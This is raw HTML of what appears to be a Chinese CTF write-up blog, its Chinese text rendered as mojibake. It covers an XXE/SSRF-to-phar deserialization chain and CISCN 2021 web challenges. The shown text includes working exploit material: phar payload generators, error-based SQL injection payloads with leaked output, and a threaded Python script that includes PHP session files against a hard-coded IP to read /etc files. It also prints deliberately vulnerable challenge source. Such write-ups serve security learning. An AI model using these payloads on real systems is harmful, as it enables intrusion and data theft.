class="string">&quot;123&quot;</span> <span class="string">&quot;PAYLOAD&quot;</span> &gt;]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br><span class="line">PAYLOAD;</span><br><span class="line"><span class="variable">$XXE_PAYLOAD</span> = str_replace(<span class="string">&quot;PAYLOAD&quot;</span>, <span class="variable">$REAL_PAYLOAD</span>, <span class="variable">$XXE_PAYLOAD</span>);</span><br><span class="line"><span class="variable">$XXE_PAYLOAD</span> = iconv(<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;utf-16&#x27;</span>, <span class="variable">$XXE_PAYLOAD</span>);</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ç”Ÿæˆå‡ºæ¥çš„è½½è·å³å¯æˆåŠŸ SSRFã€‚ç»“åˆå¦‚ä¸‹ä»£ç é‡Œçš„æ–‡ä»¶ä¸Šä¼ å’Œç®¡ç†å‘˜ç™»å½•åçš„ <code>readgzfile()</code> å‡½æ•°çš„è°ƒç”¨ï¼Œè€ƒè™‘è§¦å‘åˆ©ç”¨ phar ååºåˆ—åŒ–ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;is_admin&#x27;</span>] !== <span class="string">&#x27;0&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;you don&#x27;t have permission&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;ie=edge&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;welcome guest&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;å›¾ç‰‡åº“&lt;/h2&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">    &lt;p&gt;æ—¢ç„¶æ¥äº†ï¼Œå°±ç•™ä¸‹ç‚¹ä»€ä¹ˆå§(à²¡Ï‰à²¡)hiahiahia&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;guest.php&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    &lt;label <span class="keyword">for</span>=<span class="string">&quot;pic&quot;</span>&gt;æ–‡ä»¶åï¼š&lt;/label&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;pic&quot;</span> id=<span class="string">&quot;pic&quot;</span>&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;upload&quot;</span> value=<span class="string">&quot;æäº¤&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;pic&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;pic&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_size</span> = <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_size</span> &gt; <span class="number">2</span>*<span class="number">1024</span>*<span class="number">1024</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;pic too long&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$file_type</span> = <span class="variable">$file</span>[<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_type</span> != <span class="string">&#x27;image/jpeg&#x27;</span> &amp;&amp; <span class="variable">$file_type</span> != <span class="string">&#x27;image/gif&#x27;</span> &amp;&amp; <span class="variable">$file_type</span> != <span class="string">&#x27;image/png&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;file type error&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$ext</span> = end(explode(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(!in_array(<span class="variable">$ext</span>,<span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>)))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;file ext error&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(is_uploaded_file(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$upload_file</span> = <span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$user_path</span> = <span class="string">&#x27;./uploads/&#x27;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = time().rand(<span class="number">1</span>,<span class="number">100</span>).<span class="string">&#x27;.&#x27;</span>.<span class="variable">$ext</span>;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>],<span class="variable">$user_path</span>.<span class="variable">$filename</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$user_path</span>.<span class="variable">$filename</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    session_start();</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">secret</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$hint</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;hint = <span class="string">&#x27;readfile&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;flag = getenv(<span class="string">&#x27;ICQ_FLAG&#x27;</span>);</span><br><span class="line">            <span class="variable">$what_you_want</span> = <span class="keyword">$this</span>-&gt;flag;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&#x27;$flag&#x27;</span>.<span class="string">&#x27;= create_function(&quot;&quot;,\&#x27;echo &quot;&#x27;</span> . <span class="variable">$what_you_want</span> . <span class="string">&#x27;&quot;;\&#x27;);&#x27;</span>);</span><br><span class="line">            <span class="variable">$hint</span> = <span class="keyword">$this</span>-&gt;hint;</span><br><span class="line">            <span class="variable">$hint</span>(<span class="string">&#x27;hinttttttttttttttttttttttttttttttt.txt&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;is_admin&#x27;</span>] !== <span class="string">&#x27;1&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;only admin can see flag&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">elseif</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;is_admin&#x27;</span>] === <span class="string">&#x27;1&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;welcome admin!!!&#x27;</span>;</span><br><span class="line">        <span class="comment">// $secret = new secret();</span></span><br><span class="line">        <span class="variable">$dir</span> = scandir(<span class="string">&#x27;./uploads&#x27;</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$dir</span>[<span class="number">0</span>]);<span class="keyword">unset</span>(<span class="variable">$dir</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$beautiful</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;jpg&#x27;</span>];</span><br><span class="line">        <span class="variable">$flag_pic</span> = <span class="variable">$beautiful</span> ? <span class="variable">$beautiful</span>:<span class="variable">$dir</span>[array_rand(<span class="variable">$dir</span>,<span class="number">1</span>)];</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/^phar|smtp|compress|dict|zip|file|etc|root|filter|php|flag|ctf|hint|\.\.\//i&quot;</span>,<span class="variable">$flag_pic</span>))&#123;</span><br><span class="line">            chdir(<span class="string">&#x27;./uploads&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span>(readgzfile(<span class="variable">$flag_pic</span>))&#123;</span><br><span class="line">                copy(<span class="variable">$flag_pic</span>,<span class="string">&#x27;../lovestpic/lovest_&#x27;</span>.time().<span class="string">&#x27;.pic&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å› ä¸ºä»£ç ä¸­åªæœ‰ä¸€ä¸ªç±»ï¼Œå› æ­¤è€ƒè™‘åˆ©ç”¨è¿™ä¸ªç±»ã€‚ä»£ç ä¸­åŒ¿åå‡½æ•°çš„åˆ›å»ºæä¾›äº†åˆ©ç”¨ç‚¹ï¼Œå› ä¸ºåŒ¿åå‡½æ•°å®é™…ä¸Šæœ‰åç§°ä¸º <code>%00lambda_\d</code> çš„é»˜è®¤åç§°ã€‚å› æ­¤åªéœ€è¦è®© <code>$hint</code> å–åˆ°åŒ¿åå‡½æ•°çš„é»˜è®¤åç§°å³å¯è§¦å‘åŒ¿åå‡½æ•°è¯»å–åˆ°ç¯å¢ƒå˜é‡ä¸­çš„ flagã€‚æ„é€ å‡ºå¦‚ä¸‹è„šæœ¬æ¥ç”Ÿæˆ phar è½½è·ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">MakePhar</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Phar</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">secret</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$hint</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;hint = urldecode(<span class="string">&quot;%00lambda_3&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">MakePhar</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;EXP.phar&quot;</span>);</span><br><span class="line">        <span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line">        <span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line">        <span class="variable">$phar</span>-&gt;setMetadata(<span class="keyword">new</span> secret());</span><br><span class="line">        <span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;exp.txt&quot;</span>, <span class="string">&quot;actuallyNothingHere&quot;</span>);</span><br><span class="line">        <span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°†ç”Ÿæˆçš„è½½è·ä»¥ jpg æ‹“å±•åä½œä¸ºå›¾ç‰‡ä¸Šä¼ ï¼Œç„¶å SSRF åˆ° <code>?username=admin&amp;password=admin&amp;jpg=zlib:phar://&#123;$filename&#125;</code> è§¦å‘æ–‡ä»¶çš„è§£å‹å³å¯è§¦å‘åˆ° phar ååºåˆ—åŒ–ä»è€Œå¾—åˆ° flagã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CISCN Quals 2021</title>
      <link href="/zh-CN/posts/7c083fa1.html"/>
      <url>/zh-CN/posts/7c083fa1.html</url>
      
        <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h3><p>ç¨å¾®å°è¯•å‘ç° union å’Œ sys è¢«ç¦ç”¨ï¼ŒåŒæ—¶å¯ä»¥å‘ç°æŠ¥é”™å›æ˜¾ã€‚å› æ­¤å°è¯•æŠ¥é”™æ³¨å…¥é…åˆæ— åˆ—åæ³¨å…¥ã€‚çŒœæµ‹å­˜åœ¨ä¸€ä¸ª flag è¡¨ï¼Œæ„é€ å¦‚ä¸‹è½½è·å¾—åˆ°åˆ—åã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Submit<span class="operator">=</span><span class="operator">%</span>E7<span class="operator">%</span><span class="number">99</span><span class="operator">%</span>BB<span class="operator">%</span>E5<span class="operator">%</span>BD<span class="operator">%</span><span class="number">95</span><span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="keyword">null</span><span class="string">&#x27;) or extractvalue(1,concat(0x7e,(select * from(select * from flag a join (select * from flag)b using(id,no))c),0x7e)) %23&amp;uname=1111</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°å¦‚ä¸‹åˆ—åã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Duplicate column name &#39;4a9ad912-9910-4909-82f4-0fe381be9798&#39;</span><br></pre></td></tr></table></figure><p>å†æ¬¡æ„é€ å¦‚ä¸‹è½½è·åˆ†åˆ«è¯»å‡ºä¸¤åŠ flagã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Submit<span class="operator">=</span><span class="operator">%</span>E7<span class="operator">%</span><span class="number">99</span><span class="operator">%</span>BB<span class="operator">%</span>E5<span class="operator">%</span>BD<span class="operator">%</span><span class="number">95</span><span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="keyword">null</span><span class="string">&#x27;) or extractvalue(1,concat(0x7e,((select `4a9ad912-9910-4909-82f4-0fe381be9798`  from flag)),0x7e)) %23&amp;uname=1111\</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°ç»“æœæ˜¯ <code>XPATH syntax error: &#39;~CISCN&#123;x4lPe-j6y1T-ThuQ3-Dhd30-Z&#39;</code>ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Submit<span class="operator">=</span><span class="operator">%</span>E7<span class="operator">%</span><span class="number">99</span><span class="operator">%</span>BB<span class="operator">%</span>E5<span class="operator">%</span>BD<span class="operator">%</span><span class="number">95</span><span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="keyword">null</span><span class="string">&#x27;) or extractvalue(1,concat(0x7e,(select substr((select `4a9ad912-9910-4909-82f4-0fe381be9798`  from flag),12)),0x7e)) %23&amp;uname=1111</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°ç»“æœæ˜¯ <code>XPATH syntax error: &#39;~-j6y1T-ThuQ3-Dhd30-ZlZSt-&#125;~&#39;</code>ã€‚å°†ä¸¤æ®µ flag æ‹¼åˆå³å¯å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CISCN&#123;x4lPe-j6y1T-ThuQ3-Dhd30-ZlZSt-&#125;</span><br></pre></td></tr></table></figure><h3 id="middle-source"><a href="#middle-source" class="headerlink" title="middle_source"></a>middle_source</h3><p>é¢˜ç›®ç»™å‡ºçš„æºç å¦‚ä¸‹ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;your flag is in some file in /etc &quot;</span>;</span><br><span class="line">    <span class="variable">$fielf</span>=<span class="variable">$_POST</span>[<span class="string">&quot;field&quot;</span>];</span><br><span class="line">    <span class="variable">$cf</span>=<span class="string">&quot;/tmp/app_auth/cfile/&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;cf&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="variable">$cf</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$cf</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$$field</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°å­˜åœ¨ä¸€ä¸ªå¯æ§çš„æ–‡ä»¶åŒ…å«ï¼ŒåŒæ—¶ flag ä½äº <code>/etc</code> ç›®å½•ä¸‹çš„æ–‡ä»¶å¤¹ä¸­ã€‚åŒæ—¶å¾ˆå®¹æ˜“å‘ç°å­˜åœ¨ <code>/.listing</code>ï¼Œè¯»å–åˆ°å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">total 16 drwxr-xr-x 1 root root 4096 May 6 06:02 . drwxr-xr-x 1 root root 4096 Sep 22 2016 .. -rw-r--r-- 1 root root 257 Apr 29 11:46 index.php -rw-r--r-- 1 root root 19 Apr 29 10:51 you_can_seeeeeeee_me.php</span><br></pre></td></tr></table></figure><p>è®¿é—® <code>/you_can_seeeeeeee_me.php</code> å¯ä»¥è¯»å–åˆ° phpinfo ä»è€Œå¾—çŸ¥é¶æœº PHP ç‰ˆæœ¬ã€‚çŒœæµ‹éœ€è¦åˆ©ç”¨ session.upload_progress è¿›è¡Œæ–‡ä»¶åŒ…å«ã€‚å¾ˆå®¹æ˜“æ‰¾åˆ°å¦‚ä¸‹å‚è€ƒæ–‡ç« ã€‚</p><blockquote><p><a href="https://www.freebuf.com/vuls/202819.html">https://www.freebuf.com/vuls/202819.html</a></p></blockquote><p>å°†æ–‡ç« ä¸­çš„ PoC ç¨ä½œä¿®æ”¹å¦‚ä¸‹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27;H3Xag&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;cf&quot;</span>: <span class="string">f&quot;../../../../../var/lib/php/sessions/acafaecced/sess_<span class="subst">&#123;sessid&#125;</span>&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27; &#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        session.post(<span class="string">&#x27;http://123.60.215.249:25900/&#x27;</span>,</span><br><span class="line">                     data=&#123;</span><br><span class="line">                         <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php var_dump(readfile(&quot;/etc/acgfdffhbd/gfediefagf/hedbfegbjb/eegcbdabad/ibadcafecb/fl444444g&quot;)); ?&gt;&#x27;</span>&#125;,</span><br><span class="line">                     files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;actuallyEmpty.txt&#x27;</span>, f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">        resp = session.post(<span class="string">&#x27;http://123.60.215.249:25900/&#x27;</span>, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;CISCN&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="built_in">print</span>(resp.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+++++++++++++]retry&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure><p>å…ˆåˆ©ç”¨ <code>var_dump(scandir())</code> éå† <code>/etc</code> ç›®å½•ï¼Œæ‰¾åˆ°å¥‡æ€ªçš„è·¯å¾„ï¼Œå±‚å±‚è®¿é—®åå¯ä»¥å¾—åˆ° <code>fl444444g</code> æ–‡ä»¶ã€‚åˆ©ç”¨ <code>var_dump(readfile())</code> å°†å…¶è¯»å–å‡ºæ¥ï¼Œå³å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CISCN&#123;FhDKa-MuU0P-FJ9lj-MsZcg-6hXCa-&#125;</span><br></pre></td></tr></table></figure><h3 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h3><p>é¢˜ç›®ç»™å‡ºäº†å¦‚ä¸‹ä¸¤éƒ¨åˆ†ä»£ç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>]))</span><br><span class="line">    <span class="variable">$ctf</span> = <span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctf</span>==<span class="string">&quot;upload&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;postedFile&#x27;</span>][<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1024</span>*<span class="number">512</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;è¿™ä¹ˆå¤§ä¸ªçš„ä¸œè¥¿ä½ æ˜¯æƒ³dæˆ‘å—ï¼Ÿ&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span 